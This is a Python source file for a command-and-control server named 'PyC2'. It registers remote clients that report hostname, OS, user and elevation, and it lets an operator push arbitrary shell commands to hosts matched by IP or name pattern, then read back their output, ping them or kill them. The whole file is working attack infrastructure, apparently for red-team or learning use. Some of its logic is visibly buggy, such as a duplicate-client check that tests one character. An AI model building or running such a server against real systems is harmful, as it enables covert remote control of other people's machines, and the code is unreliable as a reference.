import socket
import threading
import time
import ipaddress
import fnmatch
from datetime import datetime
#import copy

HOST='localhost'
LISTEN_PORT=9999
BUFFER_SIZE=4096
TIMEOUT_TIME=5

'''
Netflow Diagram
Server listens on port LISTEN_PORT
Clients connect on LISTEN_PORT
Server spins up a thread to handle each connection
Client sends "REG {ipaddress} | {hostname} | {sys_os} | {cur_user} | {elevated}"
Server parses and records this, and then sends back "REG_R"
Clients await message from server in format "CMD {command}"
Clients send response to server in format "CMD_R {result.returncode} | {result.stdout} | {result.stderr}"
    This may take up to 60 seconds and server shouldnt prompt them again in the meantime
Server can send KILL to request that client exit
Client will respond with KILL_R if server requests client to exit or if there's an error
'''

"""
Datastructure Diagram
Client info is stored as a dictionary where each client's IP address is the key to a second dictionary of info about that client
Currently, client info is composed of its assigned IP address, hostname, OS, the user running the client script, whether the script is running with elevated permissions or not, and the thread handling it
clients_info['192.168.1.1'] # ['192.168.1.1', 'mybox', 'Windows 10', 'Admin', 1, socket, True, "01/02/2025 01:02:03]
client_info ={
    "ipaddr" : parts[0],
    "hostname" : parts[1],
    "sys_os" : parts[2],
    "cur_user" : parts[3],
    "elevated" : parts[4],
    "cs" : client_sock,
    "alive" : True,
    "callback" : get_time()
}
"""

clients_info = {}
#clients_dead_info = {}
clients_lock = threading.Lock()

class style():
  RED       = '\033[31m'
  GREEN     = '\033[32m'
  BLUE      = '\033[34m'
  RESET     = '\033[0m'

def main():

    # Setup the server
    server_sock = socket.socket()
    server_sock.bind((HOST,LISTEN_PORT))
    server_sock.listen(5)
    server_sock.settimeout(TIMEOUT_TIME)
    print("Server is listening...")

    handle_connect_thread = threading.Thread(target=handle_connections, args=(server_sock,), daemon=True)
    handle_connect_thread.start()

    for line in [f"\n\t************************************************",f"\t********************{style.GREEN} PyC2 {style.RESET}********************","\t************************************************"]:
        print(line)

    while True:
        command_menu()

def get_time():
    return datetime.now().strftime("%m/%d/%Y %H:%M:%S") #19 chars

def print_pretty(show_dead=True):
    global clients_info
    with clients_lock:
        sorted_dict = dict(sorted(clients_info.items(), key=lambda item: ipaddress.IPv4Address(item[0])))
        '''
        for nested in sorted_dict.values():
            nested["alive"] = True
        copy_dead = copy.deepcopy(clients_info)
        for nested in copy_dead.values():
            nested["alive"] = False

        sorted_dict.update(copy_dead)
        sorted_dict = dict(sorted(sorted_dict.items(), key=lambda item: ipaddress.ip_address(item[0])))
        '''
        if len(sorted_dict) == 0:
            print(f"{style.RED}Clients database is empty{style.RESET}")
        else:
            print(f"{style.BLUE}{'IP Address':<15} | {'Hostname':<25} | {'OS':<15} | {'Current User':<15} | {'Elevated':<8} | {'Last Callback':<19}{style.RESET}")
            for client in sorted_dict.values():
                if client["alive"]:
                    status_color = style.GREEN
                else:
                    status_color = style.RED
                    if not show_dead:
                        continue
                print(f"{status_color}{client['ipaddr']:<15} | {client['hostname']:<25} | {client['sys_os']:<15} | {client['cur_user']:<15} | {client['elevated']:<11} | {client['callback']:<19}{style.RESET}")

'''
Parses the clients dictionary and returns a list of shallow copies of matching clients
Execute this function when you have the clients_list lock
Args: dict of all clients, pattern to search (full IPADDR or HOSTNAME using ? for single char matching and * for all char matching)
'''
def search_clients(clients,pattern,alive_only=False):
    matched = []
    for client in clients.values():
        if fnmatch.fnmatch(client['ipaddr'], pattern) or fnmatch.fnmatch(client['hostname'], pattern):
            if alive_only:
                if client["alive"]:
                    matched.append(client)
            else:
                matched.append(client)
    return matched

# Execute this in a with clients_info:
def send_command_clients(clients_list,command,noisy=True):
    responses = {}
    response_lock = threading.Lock()
    threads = []

    for client_dict in clients_list:
        t = threading.Thread(target=send_command_client, args=(client_dict,command,responses,response_lock))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    # Print responses all at once and sorted
    print("\nResponses:")
    sorted_responses = dict(sorted(responses.items(), key=lambda item: ipaddress.IPv4Address(item[0])))
    for ip, response in sorted_responses.items():
        #status_code = response[len("CMD_R "):len("CMD_R ")+1]
        response_pieces = response.split(" ")
        if response_pieces[1] == "0" or response == "KILL_R server requested kill":
            print(f"{style.GREEN}{ip:<15} : {response}{style.RESET}")
        else:
            print(f"{style.RED}{ip:<15} : {response}{style.RESET}")

'''
Executes a given command on a client
Only adds item to responses if there were no keyerrors/network errors
'''
def send_command_client(client,command,responses,response_lock):
    try:
        client_ip = client["ipaddr"]
        client_socket = client["cs"]
        client_socket.send(f"{command}".encode())
        response = client_socket.recv(BUFFER_SIZE).decode()
        client["callback"] = get_time()
        with response_lock:
            responses[client_ip] = response
    except KeyError as e:
        #print("something went wrong")
        pass
    except:
        #print("something went wrong")
        pass

def command_menu():
    global clients_info

    #for line in [f"\n\t************************************************",f"\t********************{style.GREEN} PyC2 {style.RESET}********************","\t************************************************"]:
    #    print(line)
    print("\nEnter Selection:")
    for line in ["1 - List connected clients","2 - Ping Check","3 - Kill a client","4 - Send Command","5 - Exit"]: #,"4 - Exit"
        print("\t"+line)

    response = input(f"{style.BLUE}Please enter a number: {style.RESET}").strip()
    if response == "1": # List
        #with clients_lock: # used inside func
        print("This list may not be up to date - run a ping to be sure!")
        print_pretty(True)

    elif response == "2": # Ping check
        with clients_lock:
            if len(clients_info) == 0:
                print(f"{style.RED}Clients database is empty{style.RESET}")
                return
        ping_all(False)
        print_pretty(True)

    elif response == "3": # Kill by IP
        with clients_lock:
            if len(clients_info) == 0:
                print(f"{style.RED}Clients database is empty{style.RESET}")
                return
        client_ipaddr = input("Client IP(s) to kill: ").strip()
        client_cmd = "KILL"
        with clients_lock:
            clients_list = search_clients(clients_info,client_ipaddr,True)
            if len(clients_list) == 0:
                print(f"{style.RED}Found 0 clients{style.RESET}")
            else:
                print(f"{style.BLUE}Killing {len(clients_list)} found alive clients:{style.RESET}")
                for client_dict in clients_list:
                    print(f"{client_dict["ipaddr"]:<15} | ",end="")
                send_command_clients(clients_list,client_cmd,True)
                ping_all(False)
                print_pretty(True)
        '''
        with clients_lock:
            try:
                client = clients_info[client_ipaddr]
                client_ip = client["ipaddr"]
                try:
                    client["cs"].send(b"KILL")
                    client["cs"].close()
                except Exception as e:
                    print(f"{style.RED}Error when trying to send kill message to {client_ip}: {str(e)}. Client killed. {style.RESET}")
                finally:
                    client["alive"] = False
                    client["cs"] = None
            except KeyError:
                print(f"{style.RED}Client {client_ipaddr} not found.{style.RESET}")
        '''

    elif response == "4": # Command by IP
        with clients_lock:
            if len(clients_info) == 0:
                print(f"{style.RED}Clients database is empty{style.RESET}")
                return
        client_ipaddr = input("Client IP(s) to command: ").strip()
        client_cmd = input("Command: ").strip()
        client_cmd = "CMD " + client_cmd
        with clients_lock:
            clients_list = search_clients(clients_info,client_ipaddr,True)
            if len(clients_list) == 0:
                print(f"{style.RED}Found 0 clients{style.RESET}")
            else:
                print(f"{style.BLUE}Executing command on {len(clients_list)} found alive clients:{style.RESET}")
                for client_dict in clients_list:
                    print(f"{style.GREEN}{client_dict["ipaddr"]:<15}{style.RESET} | ",end="")
                send_command_clients(clients_list,client_cmd,True)

    elif response == "5": # Exit
        confirm = input(f"{style.RED}Are you sure you want to exit? This will kill the server. Type y/n: {style.RESET}").strip()
        if confirm == "y":
            exit()

def ping_all(noisy=False):
    global clients_info
    threads = []

    print(f"Beginning ping of all clients. This may take a few seconds...")

    #with clients_lock:
        #clients_snapshot = dict(clients_info) # make a copy to safely iterate. TODO this is so wrong

    for client_ip in clients_info:
        client = clients_info[client_ip]
        thread = threading.Thread(target=ping_client, args=(client, noisy))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()  # Wait for all pings to finish

def ping_client(client, noisy=False):
    cs = client["cs"]
    ip = client["ipaddr"]
    try:
        cs.settimeout(5)
        cs.send(b"PING")
        response = cs.recv(1024)
        if not response: # empty
            raise ValueError("Received empty response")
        client["callback"] = get_time()
        cs.settimeout(TIMEOUT_TIME)
        if noisy:
            print(f"{style.GREEN}Client {ip} is alive{style.RESET}")
    except Exception as e:
        if noisy:
            print(f"{style.RED}Client {ip} is dead: {e}{style.RESET}")
        with clients_lock:
            try:
                client["cs"].close()
            finally:
                client["alive"] = False
                client["cs"] = None

'''
Listens for incoming client connections and attempts to process them.
Parses initial register message and updates variables as needed.
If it receives a connection from an IP already registered, kills the old connection
Spins off a separate thread for continued handling of client comms.
'''
def handle_connections(server_sock):
    global clients_info

    # Await connections
    while True:
        try:
            client_sock,addr = server_sock.accept()
        except TimeoutError:
            continue
        print(f"Got new connection from {addr}. ",end="") # will be added onto later in the thread
        # get this into a thread ASAP so that we can handle
        thread = threading.Thread(target = handle_client2, args=(client_sock,addr))
        thread.start()

# New version of handle client that doesnt listen continuously after registration
def handle_client2(client_sock,nat_addr):
    client_sock.settimeout(TIMEOUT_TIME)

    try:
        received_msg = client_sock.recv(BUFFER_SIZE).decode()
    except Exception as e:
        print(f"Failed to receive message from {nat_addr}: {e}")
        client_sock.close()
        return

    if received_msg.startswith("REG"):
        # Register msg
        # "REG {ipaddress} | {hostname} | {sys_os} | {cur_user} | {elevated}"
        data = received_msg[len("REG "):]
        parts = [part.strip() for part in data.split('|')]
        print(f"Client resolves to {parts[0]}")

        if len(parts) != 5:
            print(f"Malformed REG message from {nat_addr}: {received_msg}")
            client_sock.send(b"KILL")
            client_sock.close()
            return

        client_info ={
            "ipaddr" : parts[0],
            "hostname" : parts[1],
            "sys_os" : parts[2],
            "cur_user" : parts[3],
            "elevated" : parts[4],
            "cs" : client_sock,
            "alive" : True,
            "callback" : get_time()
        }

        with clients_lock:
            if data[0] in clients_info:
                print(f"Client {data[0]} appears to already be connected. Killing old client...")
                old_info = clients_info[client_info["ipaddr"]]
                old_info["cs"].send(b"KILL")
                #clients_info.pop(client_info["ipaddr"]) #no need as it gets replaced
            clients_info[client_info["ipaddr"]] = client_info
        
        client_sock.send(b"REG_R")

        # Do not listen for further messages, as that will complicate the other parts of this program
        
    else:
        print(f"Unknown startup msg from {nat_addr}: {received_msg}. Killing client.")
        client_sock.send(b"KILL")
        client_sock.close()

# old
def handle_client(client_sock,addr,real_addr): #real addr is a new copy so dont worry about
    global clients_info

    while True:
        try:
            received_msg = client_sock.recv(BUFFER_SIZE).decode() # TODO sending kill makes this error 10038 an operation was attempted on something that is not a socket
            with clients_lock:
                clients_info[real_addr]["callback"] = get_time()
        except ConnectionResetError:
            print(f"Client {real_addr} lost connection")
            with clients_lock:
                #clients_dead_info[real_addr] = clients_info.pop(real_addr)
                client = clients_info["real_addr"]
                try:
                    client["cs"].close()
                finally:
                    client["alive"] = False
                    client["cs"] = None
            break
        if received_msg.startswith("KILL_R"):
            print(f"Client {real_addr} is exiting with status {received_msg[len("KILL_R "):]}")
            with clients_lock:
                #clients_dead_info[real_addr] = clients_info.pop(real_addr)
                client = clients_info["real_addr"]
                try:
                    client["cs"].close()
                finally:
                    client["alive"] = False
                    client["cs"] = None

main()